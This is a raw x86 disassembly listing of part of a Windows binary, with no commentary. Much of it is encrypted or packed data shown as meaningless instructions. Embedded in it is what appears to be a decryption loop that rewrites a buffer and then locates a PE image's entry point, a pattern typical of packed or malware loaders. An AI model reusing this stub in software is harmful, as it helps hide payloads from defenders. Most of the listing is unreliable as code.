  406204:	sub    al,0xf9
  406206:	sbb    bh,BYTE PTR [edi-0x3]
  406209:	pop    edi
  40620a:	jne    0x40618e
  40620c:	xor    eax,0xf0a27d13
  406211:	sbb    bh,bl
  406213:	cwde   
  406214:	repnz push 0xacbdbd2
  40621a:	call   0x455b6ac7
  40621f:	call   0x9ea02a92
  406224:	scas   eax,DWORD PTR es:[edi]
  406225:	sub    ebp,DWORD PTR [esp+edx*2+0x65]
  406229:	aas    
  40622a:	or     bl,dl
  40622c:	loop   0x406262
  40622e:	outs   dx,DWORD PTR ds:[esi]
  40622f:	cwde   
  406230:	test   eax,0xe4bf4670
  406235:	push   ecx
  406236:	aam    0xb3
  406238:	bound  ebx,QWORD PTR [ebx+0x48]
  40623b:	out    dx,eax
  40623c:	cdq    
  40623d:	pop    ss
  40623e:	and    BYTE PTR [ebx+eiz*1-0x4b],ah
  406242:	ficomp DWORD PTR ds:0xb4bd7142
  406248:	inc    esi
  406249:	xchg   ebx,eax
  40624a:	inc    edi
  40624b:	sub    ah,cl
  40624d:	jecxz  0x40626b
  40624f:	mov    al,ds:0xb63c618d
  406254:	shl    DWORD PTR [edx],1
  406256:	lods   eax,DWORD PTR ds:[esi]
  406257:	stos   BYTE PTR es:[edi],al
  406258:	leave  
  406259:	add    ebp,edi
  40625b:	imul   ebx,DWORD PTR [edi+0x4d4be5a4],0x18
  406262:	mov    ebp,0x1f830489
  406267:	add    esi,DWORD PTR [ecx-0x108f7f01]
  40626d:	lahf   
  40626e:	and    BYTE PTR [eax],bl
  406270:	(bad)  
  406271:	sbb    DWORD PTR [ecx+0x5e702a05],esi
  406277:	mul    BYTE PTR [edx+0x64352b45]
  40627d:	add    ah,BYTE PTR ds:0xd5e0d7eb
  406283:	shl    DWORD PTR [ecx-0x27141f78],1
  406289:	dec    ebx
  40628a:	pop    edx
  40628b:	sbb    eax,0x7483c539
  406290:	leave  
  406291:	xchg   edx,eax
  406292:	fstp   DWORD PTR [ebx+0x20]
  406295:	test   al,0x3
  406297:	mov    cl,ch
  406299:	out    dx,eax
  40629a:	xor    edx,esi
  40629c:	jecxz  0x4062c0
  40629e:	dec    esp
  40629f:	pop    eax
  4062a0:	mov    ds:0xafd7769b,al
  4062a5:	(bad)  
  4062a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062a7:	add    DWORD PTR [eax-0x6a],edx
  4062aa:	ins    BYTE PTR es:[edi],dx
  4062ab:	and    DWORD PTR [esi],ebx
  4062ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062ae:	(bad)  
  4062af:	in     al,dx
  4062b0:	daa    
  4062b1:	xor    esp,ecx
  4062b3:	pop    ebp
  4062b4:	dec    esp
  4062b5:	int3   
  4062b6:	es mov db2,esi
  4062ba:	add    ebp,DWORD PTR [ebp+0x719c60e9]
  4062c0:	jp     0x406299
  4062c2:	pop    es
  4062c3:	les    edi,FWORD PTR [edx-0x6b]
  4062c6:	aaa    
  4062c7:	aaa    
  4062c8:	loope  0x4062f5
  4062ca:	imul   ebp,DWORD PTR [ebx+0x7],0xd6bd1fdd
  4062d1:	xlat   BYTE PTR ds:[ebx]
  4062d2:	xor    DWORD PTR [ebx-0x2b],ecx
  4062d5:	sub    BYTE PTR [ebp-0x1d],0x4b
  4062d9:	push   esp
  4062da:	cmc    
  4062db:	je     0x40631b
  4062dd:	mov    al,0xcb
  4062df:	jb     0x406306
  4062e1:	mov    dh,0xeb
  4062e3:	pushf  
  4062e4:	mov    al,ds:0xd161978c
  4062e9:	mov    edx,0xdab1f20e
  4062ee:	call   0x6293e663
  4062f3:	push   ds
  4062f4:	idiv   BYTE PTR [esi-0x50e9b0e8]
  4062fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062fb:	aaa    
  4062fc:	push   ebx
  4062fd:	mov    ebx,0x1cc69ef0
  406302:	in     eax,0x5f
  406304:	sbb    eax,0xd62cfc6e
  406309:	fnstenv [edi+0x63]
  40630c:	popf   
  40630d:	and    al,bl
  40630f:	popa   
  406310:	test   BYTE PTR ds:0x55f7c684,0xdc
  406317:	jmp    0x6f503ef8
  40631c:	or     eax,0xb71957f5
  406321:	outs   dx,BYTE PTR ds:[esi]
  406322:	mov    ds:0x8c1f11d7,al
  406327:	add    ch,ah
  406329:	xor    DWORD PTR [ebp-0x5a438c3a],ebp
  40632f:	aam    0xe1
  406331:	sub    DWORD PTR [ebp+0x43e11960],edi
  406337:	push   ds
  406338:	lds    ebx,FWORD PTR [ecx+esi*8-0xf]
  40633c:	mov    esp,0xbc1d789d
  406341:	sub    BYTE PTR ds:0xaabececf,dh
  406347:	repz scas al,BYTE PTR es:[edi]
  406349:	out    dx,eax
  40634a:	adc    al,0x7c
  40634c:	addr16 xchg esp,eax
  40634e:	pop    ebx
  40634f:	or     BYTE PTR [ebp-0x70],ch
  406352:	xor    ecx,DWORD PTR [eax]
  406354:	pusha  
  406355:	in     al,dx
  406356:	or     edx,ebx
  406358:	jecxz  0x4063d6
  40635a:	lock loop 0x40631e
  40635d:	(bad)  
  40635e:	out    dx,eax
  40635f:	popa   
  406360:	sbb    al,0xb9
  406362:	jnp    0x4062fb
  406364:	mov    BYTE PTR [ecx+0x1d],cl
  406367:	push   es
  406368:	pop    ss
  406369:	sti    
  40636a:	dec    ecx
  40636b:	(bad)  
  40636c:	cmp    DWORD PTR [esi+0xa],esp
  40636f:	repz mov dl,0x22
  406372:	lahf   
  406373:	inc    esi
  406374:	pop    esp
  406375:	test   BYTE PTR [esi],bh
  406377:	mov    WORD PTR [ecx+0x56],fs
  40637a:	nop
  40637b:	sub    BYTE PTR [edx+esi*4+0xa],0xb6
  406380:	fnsave [ecx-0x7a]
  406383:	stc    
  406384:	fld    QWORD PTR [edi+edx*1]
  406387:	popf   
  406388:	add    edi,DWORD PTR [edi+ebp*2-0x7b4455b]
  40638f:	xor    ch,ah
  406391:	loop   0x4063e5
  406393:	rcr    DWORD PTR [eax+0x60b2e162],0xbc
  40639a:	push   0xa98c9b1f
  40639f:	adc    edx,ebp
  4063a1:	or     dl,ch
  4063a3:	mov    esi,0xd207beb9
  4063a8:	stc    
  4063a9:	repz cmp DWORD PTR [eax-0x3ab1cffb],esi
  4063b0:	mov    ch,0xb
  4063b2:	jnp    0x406344
  4063b4:	xchg   ebx,eax
  4063b5:	lods   eax,DWORD PTR ds:[esi]
  4063b6:	test   DWORD PTR [esi],ecx
  4063b8:	jbe    0x4063bb
  4063ba:	in     al,dx
  4063bb:	inc    BYTE PTR ds:0xa294dad6
  4063c1:	imul   DWORD PTR [eax-0x1f8f8f44]
  4063c7:	xchg   edi,eax
  4063c8:	mov    esi,?
  4063ca:	and    al,0x2f
  4063cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063cd:	xchg   ebx,eax
  4063ce:	pop    eax
  4063cf:	addr16 loop 0x4063dc
  4063d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063d3:	jbe    0x4063dc
  4063d9:	mov    edx,DWORD PTR [ebp-0x3c]
  4063dc:	mov    edi,DWORD PTR [ebp-0x4]
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	rcl    BYTE PTR [eax+0x38a5fda6],1
  406464:	jle    0x4064e4
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x4064ab
  40646b:	repnz lods al,BYTE PTR cs:[esi]
  40646e:	sub    esi,ebp
  406470:	fwait
  406471:	jo     0x4064df
  406473:	mov    DWORD PTR [ecx],edx
  406475:	or     BYTE PTR [esi+0x69],ah
  406478:	sbb    bl,BYTE PTR [ecx+0x7b]
  40647b:	inc    ebx
  40647c:	inc    edx
  40647d:	mov    esi,0x17988540
  406482:	sbb    esi,esi
  406484:	dec    esp
  406485:	adc    bh,cl
  406487:	pop    ss
  406488:	das    
  406489:	sbb    DWORD PTR [ebp-0x29],ecx
  40648c:	inc    edx
  40648d:	xchg   ecx,eax
  40648e:	aam    0x95
  406490:	out    0xe5,al
  406492:	jnp    0x4064ac
  406494:	test   ch,al
  406496:	dec    edx
  406497:	and    al,0x43
  406499:	in     al,0xf9
  40649b:	sub    al,0x99
  40649d:	inc    edx
  40649e:	sub    ah,BYTE PTR [ebp+0x4d]
  4064a1:	sub    al,0xa
  4064a3:	call   0xd19d500b
  4064a8:	int3   
  4064a9:	adc    al,0xfc
  4064ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064ac:	fwait
  4064ad:	xchg   ebx,eax
  4064ae:	xchg   edx,eax
  4064af:	mov    al,ds:0xe9ecee83
  4064b4:	jo     0x406534
  4064b6:	push   esp
  4064b7:	and    ecx,DWORD PTR ds:[edx+0x4dc470d5]
  4064be:	xor    eax,0x8a7bae5f
  4064c3:	sahf   
  4064c4:	push   0xe869d639
  4064c9:	pusha  
  4064ca:	mov    BYTE PTR [edi+0x3aba00e2],bl
  4064d0:	sub    ebp,edx
  4064d2:	sub    eax,DWORD PTR [esi+0x3e]
  4064d5:	push   eax
  4064d6:	(bad)  
  4064d7:	jno    0x406475
  4064d9:	pop    es
  4064da:	aas    
  4064db:	mov    ecx,0x7f7c5c4
  4064e0:	sub    edi,DWORD PTR [edi]
  4064e2:	nop
  4064e3:	je     0x406478
  4064e5:	ficomp DWORD PTR [edi-0x2c]
  4064e8:	mov    esi,0x8def5792
  4064ed:	mov    ah,0x3d
  4064ef:	leave  
  4064f0:	adc    BYTE PTR [eax],al
  4064f2:	inc    esi
  4064f3:	bound  esi,QWORD PTR [ebp+edx*8+0x75]
  4064f7:	retf   0xc8ad
  4064fa:	cmp    eax,0x3fab85ee
  4064ff:	es in  al,dx
  406501:	mov    eax,0xd1b5711b
  406506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406507:	inc    edx
  406508:	js     0x406557
  40650a:	out    dx,al
  40650b:	inc    edi
  40650c:	test   ah,al
  40650e:	je     0x4064bc
  406510:	xchg   ebp,eax
  406511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406512:	fcmovnb st,st(2)
  406514:	dec    eax
  406515:	outs   dx,DWORD PTR ds:[esi]
  406516:	sub    esi,edi
  406518:	mov    ah,BYTE PTR [ebx+0x35]
  40651b:	sbb    cl,BYTE PTR [edx-0x7cf598b9]
  406521:	gs jnp 0x4064c5
  406524:	push   eax
  406525:	mov    dl,0x5b
  406527:	stos   BYTE PTR es:[edi],al
  406528:	inc    ecx
  406529:	in     al,dx
  40652a:	dec    edx
  40652b:	mov    al,0xf5
  40652d:	sub    cl,BYTE PTR [ebp+0x231b9a53]
  406533:	sti    
  406534:	mov    cl,0x60
  406536:	or     cl,bh
  406538:	out    0xcf,eax
  40653a:	jmp    0x4065a6
  40653c:	test   eax,0x1c10718
  406541:	add    dh,BYTE PTR [ebx]
  406543:	(bad)  
  406544:	out    dx,eax
  406545:	adc    esp,edi
  406547:	mov    esi,0x116a1d75
  40654c:	dec    ecx
  40654d:	mov    ds:0xe30a87b5,eax
  406552:	lods   al,BYTE PTR ds:[esi]
  406553:	fldcw  WORD PTR [ecx+0x6b742014]
  406559:	adc    al,BYTE PTR [ebp-0x4a13db15]
  40655f:	or     ecx,edi
  406561:	xchg   ebp,eax
  406562:	scas   eax,DWORD PTR es:[edi]
  406563:	xor    al,0xa
  406565:	aam    0x23
  406567:	in     eax,dx
  406568:	sub    eax,0x64096a26
  40656d:	arpl   bx,sp
  40656f:	sbb    DWORD PTR [esp+edx*1-0x7d],ecx
  406573:	cmp    cl,BYTE PTR [edx]
  406575:	aaa    
  406576:	loop   0x40650c
  406578:	add    al,0xdc
  40657a:	out    0xad,al
  40657c:	gs dec ebp
  40657e:	fisub  WORD PTR [esp+edx*4-0x4f]
  406582:	xlat   BYTE PTR ds:[ebx]
  406583:	cmc    
  406584:	call   0xed8ffe4b
  406589:	xchg   edi,eax
  40658a:	jnp    0x4065cc
  40658c:	dec    ecx
  40658d:	push   eax
  40658e:	pop    ecx
  40658f:	dec    ecx
  406590:	stc    
  406591:	mov    BYTE PTR [edi-0x72],al
  406594:	and    BYTE PTR [ebp-0x62],bl
  406597:	mov    ecx,0x8d743e0
  40659c:	int    0x83
  40659e:	pop    ss
  40659f:	lds    ebp,FWORD PTR [esp+ecx*4-0x50]
  4065a3:	arpl   WORD PTR [eax+0x1b231d5e],sp
  4065a9:	rol    eax,cl
  4065ab:	clc    
  4065ac:	mov    ch,0xec
  4065ae:	in     al,dx
  4065af:	shl    BYTE PTR [edx+0xd],0xa4
  4065b3:	(bad)  
  4065b4:	clc    
  4065b5:	fimul  WORD PTR [esi-0x12]
  4065b8:	pop    edx
  4065b9:	and    dh,BYTE PTR [ebx]
  4065bb:	iret   
  4065bc:	outs   dx,BYTE PTR ds:[esi]
  4065bd:	(bad)  
  4065be:	out    0x1d,al
  4065c0:	jl     0x4065ab
  4065c2:	js     0x406600
  4065c4:	sub    al,0x70
  4065c6:	into   
  4065c7:	jne    0x406646
  4065c9:	sbb    al,0x9b
  4065cb:	clc    
  4065cc:	into   
  4065cd:	mov    ds:0x5fb05581,al
  4065d2:	(bad)  
  4065d3:	in     eax,0x7a
  4065d5:	or     BYTE PTR [edx],dh
  4065d7:	mov    eax,ds:0x5d708f37
  4065dc:	mov    ebx,0x627b7320
  4065e1:	xchg   BYTE PTR [eax-0x1f995ea8],bl
  4065e7:	mov    ecx,0x5a29c488
  4065ec:	addr16 es adc cl,al
  4065f0:	jp     0x40662d
  4065f2:	adc    eax,0x1f233f31
  4065f7:	xor    al,0x2b
  4065f9:	popa   
  4065fa:	and    al,0xaf
  4065fc:	stos   BYTE PTR es:[edi],al
  4065fd:	dec    BYTE PTR [ecx+ebp*1+0x52acd397]
  406604:	push   edi
  406605:	pushf  
  406606:	xchg   esi,eax
  406607:	add    esp,DWORD PTR [edi+0x4d9b2fc3]
  40660d:	les    ebx,FWORD PTR [edi]
  40660f:	mov    dl,0x33
  406611:	mov    eax,0xd86ce3a
  406616:	data16 aas 
  406618:	pop    ecx
  406619:	stc    
  40661a:	mov    ecx,0x94281b76
  40661f:	es inc ebp
  406621:	pop    edi
  406622:	ss push 0x4c
  406625:	imul   ebx,DWORD PTR [edi-0x3ef0eb47],0x5f65cd3c
  40662f:	sub    BYTE PTR [edx+0x35877b6],dl
  406635:	sar    BYTE PTR [esi-0xe],cl
  406638:	adc    al,0x7
  40663a:	fcmovnu st,st(7)
  40663c:	cmp    edi,DWORD PTR [eax+0x560f90e0]
  406642:	sub    eax,edi
  406644:	js     0x406691
  406646:	sbb    eax,edx
  406648:	lahf   
  406649:	loop   0x4066c2
  40664b:	repz mov bh,0xc9
  40664e:	jl     0x406641
  406650:	xchg   BYTE PTR [ebx],dh
  406652:	dec    esp
  406653:	inc    edx
  406654:	push   ss
  406655:	jae    0x4065fb
  406657:	xlat   BYTE PTR ds:[ebx]
  406658:	cmp    al,0x1
  40665a:	fdivr  QWORD PTR [eax-0x5d6161]
  406660:	mov    ds:0x5e9616ee,eax
  406665:	imul   esi,DWORD PTR [esi],0x54
  406668:	mov    ebp,0x7d551298
  40666d:	leave  
  40666e:	ret    0x7018
  406671:	pop    ecx
  406672:	div    BYTE PTR [ecx+0x784dde6d]
  406678:	inc    edi
  406679:	jp     0x406635
  40667b:	and    al,0x22
  40667d:	add    DWORD PTR [ecx+eiz*4],esi
  406680:	pop    ds
  406681:	mov    ecx,0xb87ae3fd
  406686:	xchg   ecx,eax
  406687:	fs in  eax,dx
  406689:	test   DWORD PTR [ecx+0x1ad1ff86],ecx
  40668f:	adc    DWORD PTR [ebx-0x29],edx
  406692:	and    eax,0x39d80b96
  406697:	enter  0x2a9f,0xd9
  40669b:	jecxz  0x4066f8
  40669d:	jbe    0x4066aa
  40669f:	xlat   BYTE PTR ds:[ebx]
  4066a0:	jge    0x406625
  4066a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066a3:	push   ebp
  4066a4:	aas    
  4066a5:	add    al,0x7a
  4066a7:	out    0xd2,eax
  4066a9:	stos   DWORD PTR es:[edi],eax
  4066aa:	adc    eax,0xf3c761d
  4066af:	jle    0x4066ed
  4066b1:	bound  esp,QWORD PTR [eax-0x2e]
  4066b4:	mov    es,WORD PTR [esi-0x8096dec]
  4066ba:	cdq    
  4066bb:	add    DWORD PTR [eax-0x75dc921e],ebp
  4066c1:	jnp    0x4066b0
  4066c3:	fisttp DWORD PTR [ecx]
  4066c5:	sbb    ecx,DWORD PTR [ebp-0x14f20d4c]
  4066cb:	adc    DWORD PTR [ebp-0x66b8f50f],edx
  4066d1:	(bad)  
  4066d2:	stc    
  4066d3:	shl    cl,0x73
  4066d6:	out    0x7,al
  4066d8:	(bad)  
  4066d9:	push   edx
  4066da:	dec    ebx
  4066db:	aam    0x66
  4066dd:	mov    ch,0xaf
  4066df:	(bad)  
  4066e0:	mov    BYTE PTR [eax],dh
  4066e2:	scas   eax,DWORD PTR es:[edi]
  4066e3:	test   DWORD PTR [ebx-0x740c66d3],ebp
  4066e9:	xor    BYTE PTR [ebx-0x1f],ah
  4066ec:	loopne 0x406704
  4066ee:	mov    ebp,0x9133d0b6
  4066f3:	inc    esp
  4066f4:	aad    0x30
  4066f6:	adc    bh,ch
  4066f8:	cwde   
  4066f9:	mov    ds:0x3ae1181,al
  4066fe:	xor    eax,0x3184a0f3
  406703:	pusha  
  406704:	jo     0x4066c3
  406706:	xor    ecx,esp
  406708:	mov    bl,0x93
  40670a:	add    eax,0x3196f300
  40670f:	adc    al,0xa3
  406711:	gs mov ebp,0x3cd22ff7
  406717:	sti    
  406718:	shl    DWORD PTR [edi-0x3b],1
  40671b:	rcl    BYTE PTR [ecx-0xbf972a],cl
  406721:	fwait
  406722:	jle    0x406783
  406724:	ja     0x406752
  406726:	lds    esi,FWORD PTR [esi+0x7f]
  406729:	cs push cs
  40672b:	lahf   
  40672c:	arpl   WORD PTR [ecx-0x756d3782],dx
  406732:	repz sub DWORD PTR [edx+eiz*4+0x78],esp
  406737:	sub    DWORD PTR [ebx-0x339931c4],0x27
  40673e:	xor    DWORD PTR [ebx+0x7e0d104e],edi
  406744:	(bad)  
  406745:	into   
  406746:	jne    0x4066f9
  406748:	aam    0xc4
  40674a:	mov    eax,0x42900279
  40674f:	cmp    DWORD PTR ds:0x62d19ed0,ebp
  406755:	dec    ecx
  406756:	hlt    
  406757:	ss nop
  406759:	mov    ebx,0x8c3451b1
  40675e:	add    ah,BYTE PTR [ebx]
  406760:	call   FWORD PTR [esi+0x62]
  406763:	inc    edi
  406765:	jae    0x40670c
  406767:	sbb    edx,esp
  406769:	call   edi
  40676b:	cli    
  40676c:	pop    esp
  40676d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40676e:	sahf   
  40676f:	push   esi
  406770:	ds inc ebp
  406772:	push   ds
  406773:	pop    ebp
  406774:	dec    eax
  406775:	mov    bh,0xcd
  406777:	push   esi
  406778:	add    edi,DWORD PTR [ecx+0x6ceef33a]
  40677e:	push   ds
  40677f:	ror    esi,0x22
  406782:	sbb    eax,0x4a843f43
  406787:	hlt    
  406788:	push   edi
  406789:	add    eax,0x7df98862
  40678e:	aam    0x52
  406790:	jae    0x4067ed
  406792:	inc    BYTE PTR [ecx-0x407ce756]
  406798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406799:	and    BYTE PTR [eax+edx*8+0x4f90b446],0xc0
  4067a1:	nop
  4067a2:	push   ss
  4067a3:	in     eax,0x7a
  4067a5:	pusha  
  4067a6:	xor    BYTE PTR [ebx],dh
  4067a8:	clc    
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433847
  40686e:	mov    eax,ds:0x43385f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43376b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43376b
  40688f:	inc    eax
  406890:	mov    ds:0x43376b,eax
  406895:	cmp    DWORD PTR ds:0x43376b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43376b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433910
  4068b9:	push   0x433910
  4068be:	push   0x433867
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43376b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43376b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43376b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4337fb,0x433773
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43382f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43371f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4337b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433733,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4337b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4337f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433717,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4337c3,0x433713
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp-0x349b6e39],ecx
  4069de:	int3   
  4069df:	in     al,dx
  4069e0:	dec    eax
  4069e1:	data16 (bad) 
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	push   0xdd9d1f12
  4069ee:	rcl    DWORD PTR [ebx-0x7c58bf05],1
  4069f4:	pusha  
  4069f5:	sbb    al,cl
  4069f7:	sub    eax,0xe8560198
  4069fc:	push   0x23
  4069fe:	dec    esp
  4069ff:	dec    ebx
  406a00:	retf   
  406a01:	push   ebx
  406a02:	test   DWORD PTR [ecx],esi
  406a04:	cmp    ch,BYTE PTR [edi+eax*4-0x480608ad]
  406a0b:	(bad)  
  406a0c:	fs mov ebx,0x2acefe61
  406a12:	dec    esi
  406a13:	repz rcr DWORD PTR [ebp-0x73375bfc],0xf9
  406a1b:	add    ecx,DWORD PTR [edi+0x42d2d54a]
  406a21:	inc    edx
  406a22:	xlat   BYTE PTR ds:[ebx]
  406a23:	or     DWORD PTR [esp+edx*4+0x30435dc7],0x2f57cfc7
  406a2e:	jns    0x406a93
  406a30:	outs   dx,DWORD PTR ds:[esi]
  406a31:	popf   
  406a32:	mov    dh,0x8
  406a34:	lods   eax,DWORD PTR ds:[esi]
  406a35:	es cmp ax,0xd381
  406a3a:	test   DWORD PTR [ecx-0xb],ebp
  406a3d:	jb     0x4069fb
  406a3f:	sbb    eax,0x1ef42e0d
  406a44:	leave  
  406a45:	fwait
  406a46:	(bad)  
  406a47:	and    al,0x66
  406a49:	add    dh,BYTE PTR [edx+0x54ef3a55]
  406a4f:	add    BYTE PTR [edi],ah
  406a51:	retf   
  406a52:	push   ds
  406a53:	in     al,0x8a
  406a55:	in     eax,0xaf
  406a57:	out    0x8f,eax
  406a59:	scas   al,BYTE PTR es:[edi]
  406a5a:	mov    BYTE PTR [ecx],dl
  406a5c:	sub    esi,DWORD PTR [eax+0x7d]
  406a5f:	jecxz  0x406a5d
  406a61:	outs   dx,BYTE PTR ds:[esi]
  406a62:	shl    DWORD PTR [esi],1
  406a64:	push   0x6c
